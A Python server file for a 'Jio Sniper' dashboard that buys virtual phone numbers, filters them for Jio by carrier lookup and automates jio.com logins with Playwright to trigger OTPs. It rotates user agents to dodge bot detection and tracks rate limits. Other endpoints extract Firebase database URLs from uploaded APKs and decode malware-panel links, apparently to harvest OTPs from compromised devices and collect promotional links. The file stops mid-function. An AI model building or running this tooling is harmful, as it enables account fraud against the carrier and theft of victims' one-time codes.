#!/usr/bin/env python3
"""
Jio Sniper Dashboard — Backend Server v2.0
FastAPI + Socket.IO + Playwright + Multi-Provider SMS APIs
Features: Resource Monitor, Settings, Analytics, Order Detail
"""
import asyncio
import aiohttp
import os
import re
import time
import json
import uuid
import sys
import shutil
import psutil
import random
import csv
import base64
import email
from email import policy
from urllib.parse import urlparse, parse_qs

from dotenv import load_dotenv
load_dotenv(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".env"))

from fastapi import FastAPI, Request, HTTPException, Depends, UploadFile
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
import socketio
import uvicorn

# ─── Paths ────────────────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(BASE_DIR)
# DATA_DIR can be overridden via env var for persistent volumes (e.g. Railway Volume at /data)
DATA_DIR = os.environ.get("DATA_DIR", os.path.join(PROJECT_DIR, "data"))
PROFILES_DIR = os.path.join(DATA_DIR, "profiles")
# CONFIG_FILE stored in DATA_DIR so it persists on Railway Volume
CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
ANALYTICS_FILE = os.path.join(DATA_DIR, "analytics.json")
SPEED_MAP = {"slow": 2.0, "normal": 1.0, "fast": 0.3}
ANALYTICS_MAX_AGE_DAYS = 7
PROXIES_FILE = os.path.join(DATA_DIR, "proxies.txt")

# Ensure required directories exist (Railway has ephemeral filesystem)
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(PROFILES_DIR, exist_ok=True)

def get_random_proxy():
    try:
        proxies = config.get("proxies", [])
        if proxies:
            return random.choice(proxies)
    except Exception:
        pass
    return None

# ─── Default Configuration ───────────────────────────────────────────────────
DEFAULT_CONFIG = {
    "providers": {
        "OTPSMS": {
            "url": "https://www.otpsms.in/stubs/handler_api.php",
            "key": os.environ.get("OTPSMS_API_KEY", ""),
            "service": "jio",
            "country": "",
            "delay": 3
        },
        "UOTP": {
            "url": "https://uotp.store/api/stubs/handler_api.php",
            "key": os.environ.get("UOTP_API_KEY", ""),
            "service": "jio", "country": "22", "delay": 2
        },
        "Grizzly": {
            "url": "https://api.grizzlysms.com/stubs/handler_api.php",
            "key": os.environ.get("GRIZZLY_API_KEY", ""),
            "service": "jio", "country": "22", "delay": 3
        },
        "Tiger": {
            "url": "https://api.tiger-sms.com/stubs/handler_api.php",
            "key": os.environ.get("TIGER_API_KEY", ""),
            "service": "mjo", "country": "22", "delay": 5
        },
        "MeowSMS": {
            "url": "https://meowsms.shop/stubs/handler_api.php",
            "key": os.environ.get("MEOWSMS_API_KEY", ""),
            "service": "myjio", "country": "22", "delay": 3
        },
        "OTPDoctor": {
            "url": "https://www.otpdoctor.in/stubs/handler_api.php",
            "key": os.environ.get("OTPDOCTOR_API_KEY", ""),
            "service": "13318", "country": "in", "delay": 3
        },
        "FirebaseDirect": {
            "url": "",
            "key": "",
            "service": "jio", "country": "in", "delay": 0
        }
    },
    "firebase_urls": [u.strip() for u in os.environ.get("FIREBASE_URLS", "").split(",") if u.strip()],
    "proxies": [u.strip() for u in os.environ.get("PROXY_URLS", "").split(",") if u.strip()],
    "firebase_dbs": [],
    "saved_links": [],
    "otpsms_servers": ["1", "2", "5", "6", "7", "8", "9", "11", "12", "13", "33", "36", "71", "234", "458", "2344", "4566", "64653"],
    "uotp_servers": ["5", "3", "4", "2", "1", "8"],
    "otpdoctor_services": ["13318", "13273"],
    "omkar_keys": [k.strip() for k in os.environ.get("OMKAR_API_KEYS", "").split(",") if k.strip()],
    "omkar_usage": {},
    "timing": {
        "otp_poll_interval": 3,
        "cancel_wait_seconds": 120,
        "max_otp_attempts": 60
    },
    "tg_monitor": {
        "api_id": "",
        "api_hash": "",
        "phone": "",
        "channel": "",
        "enabled": False
    }
}

JIO_LOGIN_URL = "https://www.jio.com/selfcare/login/"
OTP_CLICK_INTERVAL = 4  # Min gap between Generate OTP clicks (controlled by UI)
BROWSER_LAUNCH_INTERVAL = 4  # Interval between browser launches (controlled by UI)

# Rotating user-agents to avoid Jio bot detection
_JIO_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
]

def get_random_ua():
    return random.choice(_JIO_USER_AGENTS)

# ─── Proxies ─────────────────────────────────────────────────────────────────


# ─── Load / Save Config ──────────────────────────────────────────────────────
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                saved = json.load(f)
                # Deep merge providers so new ones (like FirebaseDirect) appear
                if "providers" in saved:
                    for p_name, p_data in DEFAULT_CONFIG["providers"].items():
                        if p_name not in saved["providers"]:
                            saved["providers"][p_name] = p_data

                # Merge with defaults for any missing keys
                merged = DEFAULT_CONFIG.copy()
                merged.update(saved)
                # Force dynamic keys from env to override saved static keys
                for p_name, p_data in merged.get("providers", {}).items():
                    default_key = DEFAULT_CONFIG["providers"].get(p_name, {}).get("key")
                    if default_key:
                        p_data["key"] = default_key
                merged["omkar_keys"] = DEFAULT_CONFIG["omkar_keys"]
                # Always prefer FIREBASE_URLS env var over saved config (env is source of truth)
                if DEFAULT_CONFIG["firebase_urls"]:
                    merged["firebase_urls"] = DEFAULT_CONFIG["firebase_urls"]
                elif "firebase_urls" not in merged:
                    merged["firebase_urls"] = []
                # Keep firebase_dbs from saved config (set via Settings UI)
                if "firebase_dbs" not in merged:
                    merged["firebase_dbs"] = []
                # Keep saved_links from saved config (persists across restarts)
                if "saved_links" not in merged:
                    merged["saved_links"] = []
                # Always prefer PROXY_URLS env var over saved config
                if DEFAULT_CONFIG["proxies"]:
                    merged["proxies"] = DEFAULT_CONFIG["proxies"]
                elif "proxies" not in merged:
                    merged["proxies"] = []
                return merged
        except:
            pass
    return DEFAULT_CONFIG.copy()

def save_config(cfg):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f, indent=2)

config = load_config()

# ─── Analytics Persistence ────────────────────────────────────────────────────
def load_analytics():
    if os.path.exists(ANALYTICS_FILE):
        try:
            with open(ANALYTICS_FILE, 'r') as f:
                data = json.load(f)
                # Purge entries older than 7 days
                cutoff = time.time() - (ANALYTICS_MAX_AGE_DAYS * 86400)
                data["events"] = [e for e in data.get("events", []) if e.get("t", 0) > cutoff]
                return data
        except:
            pass
    return {"events": [], "sessions": []}

def save_analytics():
    # Purge old entries before saving
    cutoff = time.time() - (ANALYTICS_MAX_AGE_DAYS * 86400)
    analytics["events"] = [e for e in analytics.get("events", []) if e.get("t", 0) > cutoff]
    with open(ANALYTICS_FILE, 'w') as f:
        json.dump(analytics, f)

def record_analytics_event(provider, event_type, extra=None):
    """Record a timestamped analytics event."""
    entry = {"t": time.time(), "p": provider, "e": event_type}
    if extra:
        entry.update(extra)
    analytics["events"].append(entry)
    # Cap in-memory list to prevent unbounded growth (keeps last 500)
    if len(analytics["events"]) > 500:
        analytics["events"] = analytics["events"][-500:]
    # Periodic save (every 10 events)
    if len(analytics["events"]) % 10 == 0:
        save_analytics()

analytics = load_analytics()

# ─── App Setup ────────────────────────────────────────────────────────────────
sio = socketio.AsyncServer(async_mode='asgi', cors_allowed_origins='*')
app = FastAPI()
sio_app = socketio.ASGIApp(sio, app)

static_dir = os.path.join(BASE_DIR, "static")
app.mount("/static", StaticFiles(directory=static_dir), name="static")

# Security token matching the one in the Cloudflare Worker
WEBHOOK_SECRET = "YOUR_SECRET_TOKEN"

@app.post("/api/incoming-email")
async def receive_incoming_email(request: Request):
    # 1. Verify the security token
    auth_header = request.headers.get("Authorization")
    if auth_header != f"Bearer {WEBHOOK_SECRET}":
        raise HTTPException(status_code=401, detail="Unauthorized")

    # 2. Parse the JSON from Cloudflare
    data = await request.json()
    from_address = data.get("from")
    to_address = data.get("to")
    subject = data.get("subject")
    raw_email_str = data.get("raw_email")

    print(f"📧 New Email Received from {from_address} | Subject: {subject}")

    # 3. Parse the raw email to get the plain text body
    if raw_email_str:
        msg = email.message_from_string(raw_email_str, policy=policy.default)
        body_text = ""

        if msg.is_multipart():
            for part in msg.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get("Content-Disposition"))

                if content_type == "text/plain" and "attachment" not in content_disposition:
                    body_text = part.get_payload(decode=True).decode(part.get_content_charset() or 'utf-8')
                    break
        else:
            body_text = msg.get_payload(decode=True).decode(msg.get_content_charset() or 'utf-8')

        print(f"Body snippet: {body_text.strip()[:100]}...")
        # You can add regex here to extract data from body_text

    return JSONResponse(content={"status": "success", "message": "Email processed"})

@app.get("/")
async def index():
    return FileResponse(os.path.join(static_dir, "index.html"))

@app.get("/proxy-converter")
async def proxy_converter_page():
    return FileResponse(os.path.join(BASE_DIR, "static", "proxy_converter.html"))

@app.get("/download/success")
async def download_success():
    """Download all saved links as TXT file."""
    links = config.get("saved_links", [])
    if not links:
        return JSONResponse({"error": "No links saved"}, status_code=404)
    from fastapi.responses import Response
    content_txt = "\n".join(links)
    return Response(
        content=content_txt,
        media_type="text/plain",
        headers={"Content-Disposition": "attachment; filename=gemini_links.txt"}
    )

@app.get("/download/failed")
async def download_failed():
    if not os.path.exists(FAILED_CSV):
        return {"error": "File not found"}
    return FileResponse(FAILED_CSV, media_type='text/csv', filename="failed_links.csv")

# ─── Links API ───────────────────────────────────────────────────────────────
@app.get("/api/links")
async def get_links():
    """Return all extracted links — from persistent config store"""
    links = config.get("saved_links", [])
    return JSONResponse({"links": links, "count": len(links)})

@app.post("/api/clear-links")
async def clear_links():
    """Clear all extracted links from persistent store and CSV."""
    global config
    cleared = len(config.get("saved_links", []))
    try:
        config["saved_links"] = []
        save_config(config)
        # Also clear CSV and links.txt
        if os.path.exists(SUCCESS_CSV):
            open(SUCCESS_CSV, "w").close()
        links_txt = os.path.join(DATA_DIR, "links.txt")
        if os.path.exists(links_txt):
            open(links_txt, "w").close()
    except Exception as e:
        return JSONResponse({"ok": False, "error": str(e)})
    return JSONResponse({"ok": True, "cleared": cleared})

@app.get("/api/proxies")
async def get_proxies():
    """Return saved proxies from config."""
    proxies = config.get("proxies", [])
    return JSONResponse({"proxies": proxies, "count": len(proxies)})

@app.post("/api/proxy-check")
async def check_proxies(request: Request):
    """Check latency of each proxy by making a test HTTP request."""
    body = await request.json()
    proxies = [p for p in body.get("proxies", []) if p and isinstance(p, str) and p.strip()]
    test_url = "https://httpbin.org/ip"
    timeout = aiohttp.ClientTimeout(total=10)

    async def check_one(proxy):
        start = time.time()
        try:
            async with aiohttp.ClientSession(timeout=timeout) as sess:
                async with sess.get(test_url, proxy=proxy.strip(), allow_redirects=True) as resp:
                    latency = round((time.time() - start) * 1000)
                    ok = resp.status < 400
                    return {"proxy": proxy, "ok": ok, "status": str(resp.status), "latency_ms": latency}
        except Exception as e:
            return {"proxy": proxy, "ok": False, "status": str(e)[:80], "latency_ms": None}

    results = await asyncio.gather(*[check_one(p) for p in proxies])
    return JSONResponse({"results": list(results), "count": len(results)})

@app.post("/api/delete-link")
async def delete_link(request: Request):
    """Delete a single link from persistent store."""
    global config
    body = await request.json()
    link = body.get("link", "").strip()
    list_name = body.get("list", "saved")
    if not link:
        return JSONResponse({"ok": False, "deleted": 0})
    try:
        if list_name == "checked":
            checked_csv = os.path.join(DATA_DIR, "checked_links.csv")
            if os.path.exists(checked_csv):
                rows = []
                with open(checked_csv, "r") as f:
                    rows = [r for r in csv.reader(f) if r and r[0] != link]
                with open(checked_csv, "w", newline="") as f:
                    csv.writer(f).writerows(rows)
        else:
            saved = config.get("saved_links", [])
            new_saved = [l for l in saved if l != link]
            config["saved_links"] = new_saved
            save_config(config)
            # Also remove from CSV
            if os.path.exists(SUCCESS_CSV):
                rows = []
                with open(SUCCESS_CSV, "r") as f:
                    rows = [r for r in csv.reader(f) if not (len(r) >= 4 and r[3] == link)]
                with open(SUCCESS_CSV, "w", newline="") as f:
                    csv.writer(f).writerows(rows)
        return JSONResponse({"ok": True, "deleted": 1})
    except Exception as e:
        return JSONResponse({"ok": False, "deleted": 0, "error": str(e)})

@app.get("/api/checked-links")
async def get_checked_links():
    """Return all checked links"""
    links = []
    checked_csv = os.path.join(DATA_DIR, "checked_links.csv")
    if os.path.exists(checked_csv):
        try:
            with open(checked_csv, "r") as f:
                reader = csv.reader(f)
                for row in reader:
                    if len(row) >= 2:
                        links.append({"link": row[0], "status": row[1] if len(row) > 1 else "unknown"})
        except Exception:
            pass
    return JSONResponse({"links": links, "count": len(links)})

# ─── Retry OTP Timeouts ──────────────────────────────────────────────────────
@app.post("/api/retry_otp_timeouts")
async def retry_otp_timeouts():
    """Remove 'Timed out waiting for Firebase OTP' device IDs from used_firebase_devices.txt."""
    failed_csv = os.path.join(DATA_DIR, "failed_links.csv")
    used_file = os.path.join(DATA_DIR, "used_firebase_devices.txt")

    if not os.path.exists(failed_csv):
        return {"error": "failed_links.csv not found", "removed": 0}
    if not os.path.exists(used_file):
        return {"error": "used_firebase_devices.txt not found", "removed": 0}

    # 1. Extract unique device IDs that failed with OTP timeout
    otp_device_ids = set()
    try:
        with open(failed_csv, "r") as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) >= 4 and row[3].strip() == "Timed out waiting for Firebase OTP":
                    otp_device_ids.add(row[1].strip())
    except Exception as e:
        return {"error": f"Failed to read failed_links.csv: {e}", "removed": 0}

    if not otp_device_ids:
        return {"message": "No OTP timeout entries found", "removed": 0, "remaining": 0}

    # 2. Read current used devices
    with open(used_file, "r") as f:
        used_devices = [line.strip() for line in f if line.strip()]

    original_count = len(used_devices)

    # 3. Remove OTP timeout devices
    remaining_devices = [d for d in used_devices if d not in otp_device_ids]
    removed_count = original_count - len(remaining_devices)

    # 4. Write back
    with open(used_file, "w") as f:
        for device in remaining_devices:
            f.write(device + "\n")

    return {
        "message": f"Removed {removed_count} OTP-timeout device IDs",
        "unique_timeout_ids": len(otp_device_ids),
        "removed": removed_count,
        "remaining": len(remaining_devices),
        "original": original_count
    }

# ─── APK / Link Extractor Endpoints ──────────────────────────────────────────
TSV_FILE = os.path.join(DATA_DIR, "telegram_scraped_data.tsv")

def _load_tsv_urls():
    """Load existing Firebase URLs from TSV."""
    seen = set()
    if os.path.exists(TSV_FILE):
        with open(TSV_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("----"):
                    continue
                url = line.split("\t")[0].strip().rstrip("/")
                if "firebaseio.com" in url:
                    seen.add(url)
    return seen

@app.post("/api/extract_apk")
async def extract_apk(file: UploadFile):
    """Upload an APK, extract Firebase URLs via strings command."""
    import tempfile, subprocess

    tmp_path = os.path.join(DATA_DIR, f"_tmp_{file.filename}")
    try:
        # Save uploaded APK temporarily
        content = await file.read()
        with open(tmp_path, "wb") as f:
            f.write(content)

        # Extract Firebase URLs using 'strings'
        result = subprocess.run(["strings", tmp_path], capture_output=True, text=True, timeout=30)
        urls = set()
        for line in result.stdout.splitlines():
            matches = re.findall(r"https?://[a-zA-Z0-9._-]+-default-rtdb\.firebaseio\.com", line)
            for url in matches:
                urls.add(url.rstrip("/"))

        if not urls:
            return {"urls": [], "message": "No Firebase URLs found in this APK"}

        # Check against existing TSV
        existing = _load_tsv_urls()
        results = []
        new_urls = []
        for url in sorted(urls):
            is_dup = url in existing
            results.append({"url": url, "duplicate": is_dup})
            if not is_dup:
                new_urls.append(url)

        # Auto-add new URLs to TSV
        if new_urls:
            with open(TSV_FILE, "a", encoding="utf-8") as f:
                for url in new_urls:
                    f.write(f"{url}\tUnknown\t\t\t\t\n")

        return {"urls": results, "new_count": len(new_urls), "dup_count": len(urls) - len(new_urls)}

    finally:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)

@app.post("/api/decode_links")
async def decode_links(request: Request):
    """Decode profexpanel/xipher-panel/badxweb base64 links to Firebase URLs."""
    data = await request.json()
    raw_links = data.get("links", "")

    existing = _load_tsv_urls()
    results = []
    new_urls = []

    for line in raw_links.strip().splitlines():
        line = line.strip()
        if not line:
            continue

        # Extract base64 from ?s= parameter
        firebase_urls = []
        if "?s=" in line:
            try:
                b64_str = line.split("?s=")[1].strip()
                b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
                decoded = base64.b64decode(b64_str).decode("utf-8")
                # Extract Firebase URLs from decoded string
                found = re.findall(r"https?://[a-zA-Z0-9._-]+-default-rtdb\.firebaseio\.com", decoded)
                firebase_urls = list(set(u.rstrip("/") for u in found))
            except Exception:
                results.append({"input": line[:80], "url": None, "error": "Failed to decode base64"})
                continue
        elif "firebaseio.com" in line:
            found = re.findall(r"https?://[a-zA-Z0-9._-]+-default-rtdb\.firebaseio\.com", line)
            firebase_urls = list(set(u.rstrip("/") for u in found))
        else:
            results.append({"input": line[:80], "url": None, "error": "No Firebase URL or ?s= parameter found"})
            continue

        for url in firebase_urls:
            is_dup = url in existing
            results.append({"input": line[:80], "url": url, "duplicate": is_dup})
            if not is_dup:
                new_urls.append(url)
                existing.add(url)  # prevent duplicates within same batch

    # Auto-add new URLs to TSV
    if new_urls:
        with open(TSV_FILE, "a", encoding="utf-8") as f:
            for url in new_urls:
                f.write(f"{url}\tUnknown\t\t\t\t\n")

    return {"results": results, "new_count": len(new_urls), "dup_count": len(results) - len(new_urls)}

# ─── Global State ─────────────────────────────────────────────────────────────
class State:
    orders = {}
    sniper_tasks = []
    is_sniping = False
    stop_event = None
    http_session = None
    browser = None
    pw = None
    omkar_index = 0
    dead_omkar_keys = set()
    active_browsers = 0
    jio_count = 0
    jio_count_lock = None  # initialized on first use
    target_count = 5
    stats = {"fetched": 0, "jio": 0, "otp": 0, "login": 0, "otp_times": []}
    system_monitor_task = None
    omkar_gen_stop = False

    # Batch Tracking
    batch_total = 0
    batch_checked = 0
    batch_start_time = 0

    # Firebase State
    firebase_otp_queues = {}
    firebase_listener_task = None
    last_otp_click_time = 0  # global throttle for Generate OTP clicks
    last_browser_launch_time = 0 # global throttle for browser launches
    otp_click_lock = None

    # Pause/Resume State
    pause_event = None  # asyncio.Event — set() = paused, clear() = running
    saved_devices = []  # preserved device queue during pause
    saved_device_map = {}  # preserved phone/url mappings during pause
    pause_reason = ""  # reason for auto-pause (shown in UI)

state = State()

# ─── System Resource Monitor ─────────────────────────────────────────────────
async def system_monitor_loop():
    """Emit CPU/RAM stats every 2 seconds."""
    while True:
        try:
            # interval=None makes this non-blocking. It compares against the last call.
            # Using interval=1 here blocks the entire asyncio event loop for 1 second!
            cpu = psutil.cpu_percent(interval=None)
            mem = psutil.virtual_memory()
            omkar_usage_dict = config.get("omkar_usage", {})
            omkar_keys_list = config.get("omkar_keys", [])

            omkar_data = []
            for i, key in enumerate(omkar_keys_list):
                usage = omkar_usage_dict.get(key, 0)
                omkar_data.append({
                    "label": f"Key {i+1} (..{key[-4:]})",
                    "usage": usage,
                    "max": 200
                })

            browser_count = sum(1 for o in state.orders.values() if o.get("_context") is not None)

            await sio.emit("system_stats", {
                "cpu": round(cpu, 1),
                "ram_used": round(mem.used / (1024**3), 1),
                "ram_total": round(mem.total / (1024**3), 1),
                "ram_percent": mem.percent,
                "browsers_open": browser_count,
                "omkar_data": omkar_data
            })
        except:
            pass
        await asyncio.sleep(2)

# ─── SMS API Functions ────────────────────────────────────────────────────────
async def get_balance(p_name):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return None
    try:
        async with state.http_session.get(cfg["url"], params={"action": "getBalance", "api_key": cfg["key"]}) as resp:
            text = (await resp.text()).strip()
            if text.startswith("ACCESS_BALANCE:"):
                return float(text.split(":", 1)[1])
    except:
        pass
    return None

async def buy_grizzly_number():
    """Attempt to buy a Grizzly SMS number for Chile or Indonesia for 'ot' service."""
    cfg = config["providers"].get("Grizzly", {})
    if not cfg:
        return None, None, None, None

    api_key = cfg["key"]
    base_url = cfg["url"]

    # Try Chile first (151), then Indonesia (6)
    for country_id, country_name, prefix in [("151", "Chile", "56"), ("6", "Indonesia", "62")]:
        try:
            params = {
                "api_key": api_key,
                "action": "getNumber",
                "service": "ot",  # Any other
                "country": country_id
            }
            async with state.http_session.get(base_url, params=params) as resp:
                text = (await resp.text()).strip()
                if text.startswith("ACCESS_NUMBER:"):
                    parts = text.split(":")
                    tzid = parts[1]
                    full_number = parts[2]

                    # Ensure prefix is stripped properly
                    local_number = full_number
                    if local_number.startswith(prefix):
                        local_number = local_number[len(prefix):]

                    return tzid, local_number, country_name, full_number
        except Exception:
            pass

    return None, None, None, None

async def poll_grizzly_otp(tzid, timeout=65):
    """Poll for OTP for a given transaction ID."""
    cfg = config["providers"].get("Grizzly", {})
    if not cfg:
        return None

    api_key = cfg["key"]
    base_url = cfg["url"]

    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            params = {
                "api_key": api_key,
                "action": "getStatus",
                "id": tzid
            }
            async with state.http_session.get(base_url, params=params) as resp:
                text = (await resp.text()).strip()
                if text.startswith("STATUS_OK:"):
                    return text.split(":")[1]
        except Exception:
            pass
        await asyncio.sleep(3)
    return None

async def cancel_grizzly_number(tzid):
    """Cancel number to get refund if OTP never arrived."""
    cfg = config["providers"].get("Grizzly", {})
    if not cfg:
        return False

    api_key = cfg["key"]
    base_url = cfg["url"]

    try:
        params = {
            "api_key": api_key,
            "action": "setStatus",
            "status": "8", # Cancel code for Grizzly
            "id": tzid
        }
        async with state.http_session.get(base_url, params=params) as resp:
            text = (await resp.text()).strip()
            return "ACCESS_CANCEL" in text
    except Exception:
        pass
    return False

async def get_carrier(number_str):
    if not number_str.startswith('+'): number_str = '+' + number_str
    url = "https://carrier-lookup-api.omkar.cloud/lookup"
    omkar_keys = config.get("omkar_keys", [])

    if "omkar_usage" not in config:
        config["omkar_usage"] = {}

    for _ in range(len(omkar_keys)):
        key = omkar_keys[state.omkar_index % len(omkar_keys)]
        if key not in config["omkar_usage"]:
            config["omkar_usage"][key] = 0

        try:
            async with state.http_session.get(url, params={"phone": number_str}, headers={"API-Key": key}) as resp:
                if resp.status in [429, 400, 403]:
                    data = await resp.json()
                    msg = data.get("message", "").lower()
                    if "exceeded" in msg or "verify your phone number" in msg:
                        config["omkar_usage"][key] = 200
                        save_config(config)
                        state.omkar_index = (state.omkar_index + 1) % len(omkar_keys)
                        continue
                if resp.status == 200:
                    config["omkar_usage"][key] += 1
                    save_config(config)
                    return (await resp.json()).get("carrier", "Unknown")
        except:
            pass
    return "Unknown"

async def buy_number(p_name):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return {"status": "error"}

    # Base parameters
    params = {"action": "getNumber", "api_key": cfg["key"]}
    if cfg.get("country"):
        params["country"] = cfg["country"]

    # Handle provider-specific rotations (servers or services)
    rotations = [None]
    if p_name == "OTPSMS":
        rotations = config.get("otpsms_servers", [])
        params["service"] = cfg["service"]
    elif p_name == "UOTP":
        rotations = config.get("uotp_servers", [])
        params["service"] = cfg["service"]
    elif p_name == "OTPDoctor":
        rotations = config.get("otpdoctor_services", [])
    else:
        params["service"] = cfg["service"]

    for rot in rotations:
        if p_name == "OTPSMS" and rot:
            params["server"] = rot
        elif p_name == "UOTP" and rot:
            params["operator"] = rot
        elif p_name == "OTPDoctor" and rot:
            params["service"] = rot

        try:
            async with state.http_session.get(cfg["url"], params=params) as resp:
                text = (await resp.text()).strip()
                if text.startswith("ACCESS_NUMBER:"):
                    parts = text.split(":")
                    return {"status": "success", "aid": parts[1], "phone": parts[2]}
        except:
            pass
    return {"status": "error"}

async def get_otp_status(p_name, aid):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return "ERROR"
    try:
        async with state.http_session.get(cfg["url"], params={"action": "getStatus", "api_key": cfg["key"], "id": aid}) as resp:
            return (await resp.text()).strip()
    except:
        return "ERROR"

async def cancel_api_number(p_name, aid):
    cfg = config["providers"].get(p_name, {})
    if not cfg:
        return "ERROR"
    try:
        async with state.http_session.get(cfg["url"], params={"action": "setStatus", "api_key": cfg["key"], "status": "8", "id": aid}) as resp:
            return (await resp.text()).strip()
    except:
        return "ERROR"

# ─── Order Helpers ────────────────────────────────────────────────────────────
def order_event(order, msg):
    """Add a timestamped event to an order's lifecycle log."""
    if "events" not in order:
        order["events"] = []
    order["events"].append({"t": time.time(), "msg": msg})

def safe_order(order):
    """Return order dict without internal references for JSON serialization."""
    return {k: v for k, v in order.items() if not k.startswith('_')}

async def emit_order(order):
    state.orders[order["id"]] = order
    await sio.emit("number_update", safe_order(order))

async def emit_stats():
    payload = {
        "fetched": state.stats["fetched"],
        "jio": state.stats["jio"],
        "otp": state.stats["otp"],
        "login": state.stats["login"]
    }
    otp_times = state.stats.get("otp_times", [])
    if otp_times:
        payload["otp_avg"] = round(sum(otp_times) / len(otp_times), 1)
        payload["otp_min"] = round(min(otp_times), 1)
        payload["otp_max"] = round(max(otp_times), 1)
        payload["otp_count"] = len(otp_times)
    await sio.emit("stats_update", payload)

async def emit_batch_progress():
    if state.batch_total == 0:
        return

    elapsed = time.time() - state.batch_start_time
    minutes = elapsed / 60.0

    tpm = 0
    eta_seconds = 0
    if minutes > 0:
        tpm = state.batch_checked / minutes

    remaining = max(0, state.batch_total - state.batch_checked)

    if tpm > 0:
        eta_minutes = remaining / tpm
        eta_seconds = eta_minutes * 60

    def format_time(secs):
        if secs < 60: return f"{int(secs)}s"
        m = int(secs // 60)
        s = int(secs % 60)
        if m < 60: return f"{m}m {s}s"
        h = int(m // 60)
        m = m % 60
        return f"{h}h {m}m"

    await sio.emit("batch_progress", {
        "total": state.batch_total,
        "checked": state.batch_checked,
        "remaining": remaining,
        "tpm": round(tpm, 1),
        "eta": format_time(eta_seconds) if tpm > 0 else "--:--"
    })

async def emit_log(msg, level="info"):
    await sio.emit("log", {"message": msg, "level": level})

# ─── Number Processing Pipeline ──────────────────────────────────────────────
async def process_number(p_name, aid, phone):
    order_id = str(uuid.uuid4())[:8]
    order = {
        "id": order_id, "aid": aid, "phone": phone, "provider": p_name,
        "status": "checking_carrier", "carrier": None, "otp": None,
        "timestamp": time.time(), "events": []
    }
    order_event(order, f"Number purchased from {p_name}")
    await emit_order(order)
    state.stats["fetched"] += 1
    record_analytics_event(p_name, "fetched")
    await emit_stats()

    # Check carrier
    order_event(order, "Checking carrier via MNP lookup...")
    carrier = await get_carrier(phone)
    order["carrier"] = carrier
    order_event(order, f"Carrier identified: {carrier}")

    if "jio" in carrier.lower() or "reliance" in carrier.lower():
        state.stats["jio"] += 1
        record_analytics_event(p_name, "jio")
        await emit_stats()
        order["status"] = "waiting_otp"
        await emit_order(order)
        await emit_log(f"✓ [{p_name}] {phone}: {carrier} — TRUE JIO!", "success")

        asyncio.create_task(handle_jio_number(order))
    else:
        state.jio_count = max(0, state.jio_count - 1)
        order["status"] = "non_jio"
        await emit_order(order)
        await emit_log(f"✗ [{p_name}] {phone}: {carrier}", "warn")
        asyncio.create_task(cancel_order(order))

async def handle_jio_number(order):
    try:
        await _handle_jio_number_impl(order)
    finally:
        state.jio_count = max(0, state.jio_count - 1)

async def _handle_jio_number_impl(order):
    aid = order["aid"]
    phone = order["phone"]
    p_name = order["provider"]
    timing = config.get("timing", {})
    poll_interval = timing.get("otp_poll_interval", 3)
    max_attempts = timing.get("max_otp_attempts", 60)

    clean_phone = phone[2:] if phone.startswith("91") and len(phone) > 10 else phone

    # Browser automation: Open immediately to trigger OTP
    context = None
    page = None
    if state.browser:
        try:
            order["status"] = "logging_in"
            order_event(order, "Opening browser and navigating to jio.com...")
            await emit_order(order)

            profile_path = os.path.join(PROFILES_DIR, f"session_{order['id']}")
            os.makedirs(profile_path, exist_ok=True)

            context = await state.browser.new_context(
                user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            page = await context.new_page()

            order["_context"] = context
            order["_page"] = page

            await page.goto(JIO_LOGIN_URL, wait_until="domcontentloaded", timeout=60000)
            await asyncio.sleep(2)

            order_event(order, f"Typing phone number: {clean_phone}")
            await page.locator('[data-testid="numberField"]').fill(clean_phone)
            await asyncio.sleep(1)

            order_event(order, "Clicking Generate OTP...")
            await page.locator('[data-testid="generateOTPButton"]').click()
            await emit_log(f"[{phone}] Clicked Generate OTP on jio.com", "info")
            await asyncio.sleep(2)

            # Detect Jio IP Rate Limits
            if await page.locator('text="exceeded the maximum attempts"').count() > 0:
                raise Exception("Jio IP Rate Limited: Exceeded max attempts!")
            if await page.locator('text="try again after some time"').count() > 0:
                raise Exception("Jio IP Rate Limited: Try again later!")


        except Exception as e:
            err_msg = str(e)
            order_event(order, f"Browser setup failed: {err_msg}")

            if "Rate Limited" in err_msg:
                await emit_log(f"🚨 [{phone}] Jio Rate Limit hit! Cancelling number.", "error")
